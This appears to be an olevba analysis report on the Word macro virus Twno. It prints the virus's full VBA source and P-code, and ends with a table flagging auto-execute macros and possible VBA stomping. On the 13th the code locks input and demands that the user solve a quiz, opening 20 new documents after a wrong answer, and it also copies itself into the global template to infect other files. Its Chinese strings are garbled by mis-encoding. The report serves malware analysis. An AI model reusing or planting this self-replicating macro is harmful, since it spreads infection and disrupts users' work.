olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.aa - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim test
Dim con
Dim tog$
Dim i
Dim ans$
Dim j
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 13 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
test = -1
con = 1
tog$ = ""
i = 0

        While test = -1

            For i = 0 To 4
            nm__(i) = WordBasic.Int(Rnd() * 10000)
            con = (con * nm__(i))
            If i = 4 Then
            tog$ = tog$ + Str(nm__(4)) + " =?"
            GoTo beg
            End If
            tog$ = tog$ + Str(nm__(i)) + " *"
            Next i
beg:
            WordBasic.Beep
            ans$ = WordBasic.[InputBox$]("､ｵ､ﾑｬO " + WordBasic.[Date$]() + " ,ｸAｪｱ､@ｭﾓ､ﾟｺ篁Cﾀｸ" + Chr(13) + _
"ｭYｧAｵｪｿ�,･uｦnｱｵｨ�ｾ_ｾﾙｱﾐｨ|.............." + Chr(13) + _
tog$, "･xﾆW NO.1 Macro Virus")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = WordBasic.[LTrim$](Str(con)) Then
            WordBasic.MsgBox "ｮ･ｶPｧAｵｪｹ�､F,ｫTｩwｴNｧiｶDｧAｷQｪｾｹDｪｺ....", _
                    "･xﾆW NO.1 Macro Virus"
            WordBasic.FileNewDefault
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
            WordBasic.Beep
            WordBasic.Insert "ｦﾗ･ｨｶｰｯfｬr｡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "ｵｪｮﾗ:"
            WordBasic.Italic 1
            WordBasic.Insert "ｧﾚｴNｬO....."
            WordBasic.InsertPara
            WordBasic.InsertPara
            WordBasic.Italic 0
            WordBasic.FormatFont Font:="ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
            WordBasic.Beep
            WordBasic.Insert "ｦpｦwｨｾ･ｨｶｰｯfｬr｡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "ｵｪｮﾗ:"
            WordBasic.Italic 1
            WordBasic.Insert "､｣ｭnｬﾝｧﾚ....."
            GoTo exit_
            Else
            For j = 1 To 20
            WordBasic.Beep
            WordBasic.FileNewDefault
            Next j
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
            WordBasic.Insert "･ｨｶｰｯfｬr"
            GoTo try
            End If

        Wend
            End If

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
    WordBasic.MacroCopy filem$, "AutoNew"
    WordBasic.MacroCopy filem$, "AutoClose"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", filem$
End If

    

exit_:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Twno.aa
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 6068 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn nm__
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	OptionBase 
' 	LitDI2 0x0004 
' 	Redim nm__ 0x0001 (As Variant)
' Line #4:
' 	Dim 
' 	VarDefn test
' Line #5:
' 	Dim 
' 	VarDefn con
' Line #6:
' 	Dim 
' 	VarDefn tog
' Line #7:
' 	Dim 
' 	VarDefn i
' Line #8:
' 	Dim 
' 	VarDefn ans
' Line #9:
' 	Dim 
' 	VarDefn j
' Line #10:
' 	Dim 
' 	VarDefn nor
' Line #11:
' 	Dim 
' 	VarDefn kk
' Line #12:
' 	Dim 
' 	VarDefn t
' Line #13:
' 	Dim 
' 	VarDefn file
' Line #14:
' 	Dim 
' 	VarDefn filem
' Line #15:
' 	Dim 
' 	VarDefn nor1
' Line #16:
' 	Dim 
' 	VarDefn kkk
' Line #17:
' 	Dim 
' 	VarDefn tt
' Line #18:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Label try 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #22:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError try 
' Line #23:
' 	LitDI2 0x0001 
' 	UMi 
' 	St test 
' Line #24:
' 	LitDI2 0x0001 
' 	St con 
' Line #25:
' 	LitStr 0x0000 ""
' 	St tog$ 
' Line #26:
' 	LitDI2 0x0000 
' 	St i 
' Line #27:
' Line #28:
' 	Ld test 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	While 
' Line #29:
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #31:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x2710 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	Ld i 
' 	ArgsSt nm__ 0x0001 
' Line #32:
' 	Ld con 
' 	Ld i 
' 	ArgsLd nm__ 0x0001 
' 	Mul 
' 	Paren 
' 	St con 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld tog$ 
' 	LitDI2 0x0004 
' 	ArgsLd nm__ 0x0001 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0003 " =?"
' 	Add 
' 	St tog$ 
' Line #35:
' 	GoTo beg 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld tog$ 
' 	Ld i 
' 	ArgsLd nm__ 0x0001 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0002 " *"
' 	Add 
' 	St tog$ 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Label beg 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #41:
' 	LineCont 0x0008 19 00 00 00 20 00 00 00
' 	LitStr 0x0007 "､ｵ､ﾑｬO "
' 	Ld WordBasic 
' 	ArgsMemLd [Date$] 0x0000 
' 	Add 
' 	LitStr 0x0014 " ,ｸAｪｱ､@ｭﾓ､ﾟｺ篁Cﾀｸ"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0027 "ｭYｧAｵｪｿ�,･uｦnｱｵｨ�ｾ_ｾﾙｱﾐｨ|.............."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld tog$ 
' 	Add 
' 	LitStr 0x0015 "･xﾆW NO.1 Macro Virus"
' 	Ld WordBasic 
' 	ArgsMemLd [InputBox$] 0x0002 
' 	St ans$ 
' Line #42:
' 	Ld ans$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [RTrim$] 0x0001 
' 	Ld con 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LineCont 0x0004 05 00 14 00
' 	LitStr 0x0027 "ｮ･ｶPｧAｵｪｹ�､F,ｫTｩwｴNｧiｶDｧAｷQｪｾｹDｪｺ...."
' 	LitStr 0x0015 "･xﾆW NO.1 Macro Virus"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #44:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemCall CenterPara 0x0000 
' Line #46:
' 	LitStr 0x002A "ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
' 	ParamNamed Font 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0001 
' Line #47:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #48:
' 	LitStr 0x000E "ｦﾗ･ｨｶｰｯfｬr｡H"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #49:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #50:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #51:
' 	LitStr 0x0005 "ｵｪｮﾗ:"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Italic 0x0001 
' Line #53:
' 	LitStr 0x000B "ｧﾚｴNｬO....."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #54:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #55:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #56:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Italic 0x0001 
' Line #57:
' 	LitStr 0x002A "ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
' 	ParamNamed Font 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0001 
' Line #58:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #59:
' 	LitStr 0x0012 "ｦpｦwｨｾ･ｨｶｰｯfｬr｡H"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #60:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #61:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #62:
' 	LitStr 0x0005 "ｵｪｮﾗ:"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Italic 0x0001 
' Line #64:
' 	LitStr 0x000D "､｣ｭnｬﾝｧﾚ....."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #65:
' 	GoTo exit_ 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #68:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #69:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #70:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld WordBasic 
' 	ArgsMemCall CenterPara 0x0000 
' Line #72:
' 	LitStr 0x002A "ｲﾓｩ愰�", Points:=16, Bold:=1, Underline:=1"
' 	ParamNamed Font 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0001 
' Line #73:
' 	LitStr 0x0008 "･ｨｶｰｯfｬr"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #74:
' 	GoTo try 
' Line #75:
' 	EndIfBlock 
' Line #76:
' Line #77:
' 	Wend 
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St nor 
' Line #81:
' 	Ld nor 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld kk 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nor 
' 	For 
' Line #83:
' 	Ld kk 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	St t 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld kk 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St file$ 
' Line #91:
' 	Ld file$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St filem$ 
' Line #92:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #93:
' 	Ld filem$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #94:
' 	Ld filem$ 
' 	LitStr 0x0007 "AutoNew"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #95:
' 	Ld filem$ 
' 	LitStr 0x0009 "AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #96:
' 	EndIfBlock 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St nor1 
' Line #99:
' 	Ld nor1 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld kkk 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nor1 
' 	For 
' Line #101:
' 	Ld kkk 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St tt 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld kkk 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' Line #106:
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	Ld tt 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #109:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #110:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld filem$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' 	Label exit_ 
' Line #116:
' 	EndSub 
' Line #117:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

